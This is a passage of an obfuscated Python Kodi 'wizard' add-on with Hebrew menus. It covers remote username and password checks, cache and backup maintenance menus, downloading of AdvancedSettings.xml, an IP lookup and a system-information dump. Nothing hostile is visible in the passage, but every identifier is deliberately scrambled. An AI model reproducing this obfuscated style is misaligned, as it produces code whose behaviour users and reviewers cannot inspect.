	OOOO00OO000OO0000 =(ADDON .getSetting ("pass"))#line:2449
	if BUILDNAME =="":#line:2450
	 if not NOTIFY =='true':#line:2451
          O0OO0O00O0O00OO00 =wiz .workingURL (NOTIFICATION )#line:2452
	 if not NOTIFY2 =='true':#line:2453
          O0OO0O00O0O00OO00 =wiz .workingURL (NOTIFICATION2 )#line:2454
	 if not NOTIFY3 =='true':#line:2455
          O0OO0O00O0O00OO00 =wiz .workingURL (NOTIFICATION3 )#line:2456
	O0OOO00OO0O00O00O =OOOO00OO000OO0000 #line:2457
	O0OO0O00O0O00OO00 =urllib2 .Request (SPEED )#line:2458
	O0O0O0000000OO000 =urllib2 .urlopen (O0OO0O00O0O00OO00 )#line:2459
	O0000O0O0OOO0OO0O =O0O0O0000000OO000 .readlines ()#line:2461
	OO0O000O00O000O0O =0 #line:2465
	for OO00O0O0O0OO0000O in O0000O0O0OOO0OO0O :#line:2466
		if OO00O0O0O0OO0000O .split (' ==')[0 ]==OOOO00OO000OO0000 or OO00O0O0O0OO0000O .split ()[0 ]==OOOO00OO000OO0000 :#line:2467
			OO0O000O00O000O0O =1 #line:2468
			break #line:2469
	if OO0O000O00O000O0O ==0 :#line:2470
					OOOO0OOOO000O000O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2471
					if OOOO0OOOO000O000O :#line:2473
						ADDON .openSettings ()#line:2475
						STARTP ()#line:2476
						sys .exit ()#line:2477
					else :#line:2478
						sys .exit ()#line:2479
	return 'ok'#line:2483
def STARTP2 ():#line:2484
	O00O0OO00OO0O0O00 =(ADDON .getSetting ("user"))#line:2485
	O0O0O00OOOO0OOO00 =(UNAME )#line:2487
	OOOO0O00O0O000O00 =urllib2 .urlopen (O0O0O00OOOO0OOO00 )#line:2488
	O0000O00000OOO0O0 =OOOO0O00O0O000O00 .readlines ()#line:2489
	O0000O0OOO0000O0O =0 #line:2490
	for OOO0OO00OOOOO0O00 in O0000O00000OOO0O0 :#line:2493
		if OOO0OO00OOOOO0O00 .split (' ==')[0 ]==O00O0OO00OO0O0O00 or OOO0OO00OOOOO0O00 .split ()[0 ]==O00O0OO00OO0O0O00 :#line:2494
			O0000O0OOO0000O0O =1 #line:2495
			break #line:2496
	if O0000O0OOO0000O0O ==0 :#line:2497
		O00OO00OOO00O0O00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2498
		if O00OO00OOO00O0O00 :#line:2500
			ADDON .openSettings ()#line:2502
			STARTP2 ()#line:2504
			sys .exit ()#line:2505
		else :#line:2506
			sys .exit ()#line:2507
	return 'ok'#line:2511
def passandpin ():#line:2512
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2513
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2514
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2515
def passandUsername ():#line:2516
	ADDON .openSettings ()#line:2517
def folderback ():#line:2520
    OOOO0OOO000000000 =ADDON .getSetting ("path")#line:2521
    if OOOO0OOO000000000 :#line:2522
      OOOO0OOO000000000 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2523
      ADDON .setSetting ("path",OOOO0OOO000000000 )#line:2524
def backmyupbuild ():#line:2527
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2531
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2532
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2533
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2535
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2536
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2537
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2539
def maintMenu (view =None ):#line:2543
	OO00OOOOO0OOOOO00 ='[B][COLOR green]ON[/COLOR][/B]';OO00O0O0O0O0O0O00 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2545
	O00OOO0O0OO00O000 ='true'if AUTOCLEANUP =='true'else 'false'#line:2546
	O0OO0OO00000O0000 ='true'if AUTOCACHE =='true'else 'false'#line:2547
	O0OO000OO0OO0OOO0 ='true'if AUTOPACKAGES =='true'else 'false'#line:2548
	O0OOO00000O0000O0 ='true'if AUTOTHUMBS =='true'else 'false'#line:2549
	O00O00O0OOOOO0OOO ='true'if SHOWMAINT =='true'else 'false'#line:2550
	O00OOOOO0OOO0OO0O ='true'if INCLUDEVIDEO =='true'else 'false'#line:2551
	OO0OO0O0000OO00O0 ='true'if INCLUDEALL =='true'else 'false'#line:2552
	OO0O00O0O00O000OO ='true'if THIRDPARTY =='true'else 'false'#line:2553
	if wiz .Grab_Log (True )==False :O0O0OOOOOO000OOOO =0 #line:2554
	else :O0O0OOOOOO000OOOO =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2555
	if wiz .Grab_Log (True ,True )==False :O0OOOO00OOOO000OO =0 #line:2556
	else :O0OOOO00OOOO000OO =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2557
	OO0O0OO00O0OO00O0 =int (O0O0OOOOOO000OOOO )+int (O0OOOO00OOOO000OO )#line:2558
	OOO0OO0OOOOO0OOOO =str (OO0O0OO00O0OO00O0 )+' Error(s) Found'if OO0O0OO00O0OO00O0 >0 else 'None Found'#line:2559
	OOOO0O0O00O0000OO =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2560
	if OO0OO0O0000OO00O0 =='true':#line:2561
		OO00OO0O0OO0OO00O ='true'#line:2562
		OO00O00000OOOO00O ='true'#line:2563
		OOO00OO000OOOO0O0 ='true'#line:2564
		O00OO00OO0O00OOO0 ='true'#line:2565
		O000OO000OO000000 ='true'#line:2566
		O0OOO00O00OO0OOO0 ='true'#line:2567
		O0OO0O0O00O0OOO00 ='true'#line:2568
		O0000OO000OO0000O ='true'#line:2569
	else :#line:2570
		OO00OO0O0OO0OO00O ='true'if INCLUDEBOB =='true'else 'false'#line:2571
		OO00O00000OOOO00O ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2572
		OOO00OO000OOOO0O0 ='true'if INCLUDESPECTO =='true'else 'false'#line:2573
		O00OO00OO0O00OOO0 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2574
		O000OO000OO000000 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2575
		O0OOO00O00OO0OOO0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2576
		O0OO0O0O00O0OOO00 ='true'if INCLUDESALTS =='true'else 'false'#line:2577
		O0000OO000OO0000O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2578
	O00OO0OO00O0000O0 =wiz .getSize (PACKAGES )#line:2579
	O0O0O0OOO0OOOO0O0 =wiz .getSize (THUMBS )#line:2580
	O0O00OO0O000O0OO0 =wiz .getCacheSize ()#line:2581
	O00O0O0OO000O0OO0 =O00OO0OO00O0000O0 +O0O0O0OOO0OOOO0O0 +O0O00OO0O000O0OO0 #line:2582
	O0000O00O0O000000 =['Daily','Always','3 Days','Weekly']#line:2583
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2584
	if view =="clean"or SHOWMAINT =='true':#line:2585
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O0O0OO000O0OO0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2586
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O00OO0O000O0OO0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2587
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00OO0OO00O0000O0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2588
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0O0OOO0OOOO0O0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2589
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2590
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2591
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2592
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2593
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2594
	if view =="addon"or SHOWMAINT =='false':#line:2595
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2596
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2597
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2598
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2599
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2600
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2601
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2602
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2603
	if view =="misc"or SHOWMAINT =='true':#line:2604
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2605
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2606
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2607
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2608
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2609
		addFile ('View Errors in Log: %s'%(OOO0OO0OOOOO0OOOO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2610
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2611
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2612
		addFile ('Clear Wizard Log File%s'%OOOO0O0O00O0000OO ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2613
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2614
	if view =="backup"or SHOWMAINT =='true':#line:2615
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2616
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2617
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2618
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2619
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2620
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2621
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2622
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2623
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2624
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2625
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2626
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2627
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2628
	if view =="tweaks"or SHOWMAINT =='true':#line:2629
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2630
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2631
		else :#line:2632
			if os .path .exists (ADVANCED ):#line:2633
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2634
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2635
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2636
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2637
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2638
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2639
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2640
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2641
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2642
	addFile ('Show All Maintenance: %s'%O00O00O0OOOOO0OOO .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2643
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2644
	addFile ('Third Party Wizards: %s'%OO0O00O0O00O000OO .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2645
	if OO0O00O0O00O000OO =='true':#line:2646
		O000OOOOOO0OO000O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2647
		OOO00O0O0OO0OOOOO =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2648
		OO0OOO0OO00O000OO =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2649
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O000OOOOOO0OO000O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2650
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO00O0O0OO0OOOOO ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2651
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0OOO0OO00O000OO ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2652
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2653
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O00OOO0O0OO00O000 .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2654
	if O00OOO0O0OO00O000 =='true':#line:2655
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0000O00O0O000000 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2656
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0OO0OO00000O0000 .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2657
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0OO000OO0OO0OOO0 .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2658
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0OOO00000O0000O0 .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2659
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2660
	addFile ('Include Video Cache in Clear Cache: %s'%O00OOOOO0OOO0OO0O .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2661
	if O00OOOOO0OOO0OO0O =='true':#line:2662
		addFile ('--- Include All Video Addons: %s'%OO0OO0O0000OO00O0 .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2663
		addFile ('--- Include Bob: %s'%OO00OO0O0OO0OO00O .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2664
		addFile ('--- Include Phoenix: %s'%OO00O00000OOOO00O .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2665
		addFile ('--- Include Specto: %s'%OOO00OO000OOOO0O0 .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2666
		addFile ('--- Include Exodus: %s'%O000OO000OO000000 .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2667
		addFile ('--- Include Salts: %s'%O0OO0O0O00O0OOO00 .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2668
		addFile ('--- Include Salts HD Lite: %s'%O0000OO000OO0000O .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2669
		addFile ('--- Include One Channel: %s'%O0OOO00O00OO0OOO0 .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2670
		addFile ('--- Include Genesis: %s'%O00OO00OO0O00OOO0 .replace ('true',OO00OOOOO0OOOOO00 ).replace ('false',OO00O0O0O0O0O0O00 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2671
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2672
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2673
	setView ('files','viewType')#line:2674
def advancedWindow (url =None ):#line:2676
	if not ADVANCEDFILE =='http://':#line:2677
		if url ==None :#line:2678
			OOOOO00O0O000OOO0 =wiz .workingURL (ADVANCEDFILE )#line:2679
			OOO0O00O0O0OOO00O =uservar .ADVANCEDFILE #line:2680
		else :#line:2681
			OOOOO00O0O000OOO0 =wiz .workingURL (url )#line:2682
			OOO0O00O0O0OOO00O =url #line:2683
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2684
		if os .path .exists (ADVANCED ):#line:2685
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2686
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2687
		if OOOOO00O0O000OOO0 ==True :#line:2688
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2689
			OOOOO00OOOOO0O000 =wiz .openURL (OOO0O00O0O0OOO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2690
			O0000OO0O0OO0OOOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOOOO00OOOOO0O000 )#line:2691
			if len (O0000OO0O0OO0OOOO )>0 :#line:2692
				for O00OO0OOO0000OOO0 ,OO0O0O0OO0000OOO0 ,url ,O0OOO0000O00O00OO ,O00OOOO00OOO0000O ,O0000000OOOO00000 in O0000OO0O0OO0OOOO :#line:2693
					if OO0O0O0OO0000OOO0 .lower ()=="yes":#line:2694
						addDir ("[B]%s[/B]"%O00OO0OOO0000OOO0 ,'advancedsetting',url ,description =O0000000OOOO00000 ,icon =O0OOO0000O00O00OO ,fanart =O00OOOO00OOO0000O ,themeit =THEME3 )#line:2695
					else :#line:2696
						addFile (O00OO0OOO0000OOO0 ,'writeadvanced',O00OO0OOO0000OOO0 ,url ,description =O0000000OOOO00000 ,icon =O0OOO0000O00O00OO ,fanart =O00OOOO00OOO0000O ,themeit =THEME2 )#line:2697
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2698
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOOO00O0O000OOO0 )#line:2699
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2700
def writeAdvanced (O000OOOOO0OO00000 ,O0O000O0O000OO000 ):#line:2702
	O00O0OOO00000OOO0 =wiz .workingURL (O0O000O0O000OO000 )#line:2703
	if O00O0OOO00000OOO0 ==True :#line:2704
		if os .path .exists (ADVANCED ):O0OOO00OO0O00OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O000OOOOO0OO00000 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2705
		else :O0OOO00OO0O00OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O000OOOOO0OO00000 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2706
		if O0OOO00OO0O00OO0O ==1 :#line:2708
			O0O00000O0OO0O00O =wiz .openURL (O0O000O0O000OO000 )#line:2709
			OO0O0O0O00O000OOO =open (ADVANCED ,'w');#line:2710
			OO0O0O0O00O000OOO .write (O0O00000O0OO0O00O )#line:2711
			OO0O0O0O00O000OOO .close ()#line:2712
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2713
			wiz .killxbmc (True )#line:2714
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2715
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O00O0OOO00000OOO0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2716
def viewAdvanced ():#line:2718
	OO00O00O00O0OO00O =open (ADVANCED )#line:2719
	O0OO00OO0O00OOOOO =OO00O00O00O0OO00O .read ().replace ('\t','    ')#line:2720
	wiz .TextBox (ADDONTITLE ,O0OO00OO0O00OOOOO )#line:2721
	OO00O00O00O0OO00O .close ()#line:2722
def removeAdvanced ():#line:2724
	if os .path .exists (ADVANCED ):#line:2725
		wiz .removeFile (ADVANCED )#line:2726
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2727
def showAutoAdvanced ():#line:2729
	notify .autoConfig ()#line:2730
def getIP ():#line:2732
	O00OO0OOOOOO000OO ='http://whatismyipaddress.com/'#line:2733
	if not wiz .workingURL (O00OO0OOOOOO000OO ):return 'Unknown','Unknown','Unknown'#line:2734
	O00OO0O000OO0O00O =wiz .openURL (O00OO0OOOOOO000OO ).replace ('\n','').replace ('\r','')#line:2735
	if not 'Access Denied'in O00OO0O000OO0O00O :#line:2736
		O0OO0O0O0000OO00O =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O00OO0O000OO0O00O )#line:2737
		OO00000O00OO00O0O =O0OO0O0O0000OO00O [0 ]if (len (O0OO0O0O0000OO00O )>0 )else 'Unknown'#line:2738
		O0OO0O00OO0O0O0OO =re .compile ('"font-size:14px;">(.+?)</td>').findall (O00OO0O000OO0O00O )#line:2739
		OOO0O0O0OO0000OO0 =O0OO0O00OO0O0O0OO [0 ]if (len (O0OO0O00OO0O0O0OO )>0 )else 'Unknown'#line:2740
		OOOOOOOOO0OO00O00 =O0OO0O00OO0O0O0OO [1 ]+', '+O0OO0O00OO0O0O0OO [2 ]+', '+O0OO0O00OO0O0O0OO [3 ]if (len (O0OO0O00OO0O0O0OO )>2 )else 'Unknown'#line:2741
		return OO00000O00OO00O0O ,OOO0O0O0OO0000OO0 ,OOOOOOOOO0OO00O00 #line:2742
	else :return 'Unknown','Unknown','Unknown'#line:2743
def systemInfo ():#line:2745
	O0000O00O0O0O0000 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2759
	O0O0OOOOO0O0OO0OO =[];OO00OO0OOOO00O0O0 =0 #line:2760
	for OO00O0000O0O00OO0 in O0000O00O0O0O0000 :#line:2761
		O0O0OOOOOO0OO0OOO =wiz .getInfo (OO00O0000O0O00OO0 )#line:2762
		OO00OO0O000O0O00O =0 #line:2763
		while O0O0OOOOOO0OO0OOO =="Busy"and OO00OO0O000O0O00O <10 :#line:2764
			O0O0OOOOOO0OO0OOO =wiz .getInfo (OO00O0000O0O00OO0 );OO00OO0O000O0O00O +=1 ;wiz .log ("%s sleep %s"%(OO00O0000O0O00OO0 ,str (OO00OO0O000O0O00O )));xbmc .sleep (1000 )#line:2765
		O0O0OOOOO0O0OO0OO .append (O0O0OOOOOO0OO0OOO )#line:2766
		OO00OO0OOOO00O0O0 +=1 #line:2767
	O00O0OO00O0000O0O =O0O0OOOOO0O0OO0OO [8 ]if 'Una'in O0O0OOOOO0O0OO0OO [8 ]else wiz .convertSize (int (float (O0O0OOOOO0O0OO0OO [8 ][:-8 ]))*1024 *1024 )#line:2768
	OO0O000O00O0000O0 =O0O0OOOOO0O0OO0OO [9 ]if 'Una'in O0O0OOOOO0O0OO0OO [9 ]else wiz .convertSize (int (float (O0O0OOOOO0O0OO0OO [9 ][:-8 ]))*1024 *1024 )#line:2769
	OOO0O0O00O0OO0OO0 =O0O0OOOOO0O0OO0OO [10 ]if 'Una'in O0O0OOOOO0O0OO0OO [10 ]else wiz .convertSize (int (float (O0O0OOOOO0O0OO0OO [10 ][:-8 ]))*1024 *1024 )#line:2770
	O00O0OOO0OO0OO0O0 =wiz .convertSize (int (float (O0O0OOOOO0O0OO0OO [11 ][:-2 ]))*1024 *1024 )#line:2771
	O00OO0O00OO0000O0 =wiz .convertSize (int (float (O0O0OOOOO0O0OO0OO [12 ][:-2 ]))*1024 *1024 )#line:2772
	OOOOO00O000O000O0 =wiz .convertSize (int (float (O0O0OOOOO0O0OO0OO [13 ][:-2 ]))*1024 *1024 )#line:2773
	O00O0O00O00000O0O ,O00O0O00O0O000OOO ,O00OO0000OO000O0O =getIP ()#line:2774
	OO00OOOO0OO0O0O0O =[];OOOO000O0000O0OOO =[];O000000OO00000000 =[];OOOO000000O00OO00 =[];OO0O00OO00O00O0OO =[];O0O0OO0OOOOOO0O00 =[];OO0OO0O0OOOO0OOOO =[]#line:2776
	OO0O0OO0OOOO00O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:2778
	for OOOO0000O000O0OOO in sorted (OO0O0OO0OOOO00O0O ,key =lambda OOOO0O0000O00O00O :OOOO0O0000O00O00O ):#line:2779
		OO0OO0O0O0O00OOO0 =os .path .split (OOOO0000O000O0OOO [:-1 ])[1 ]#line:2780
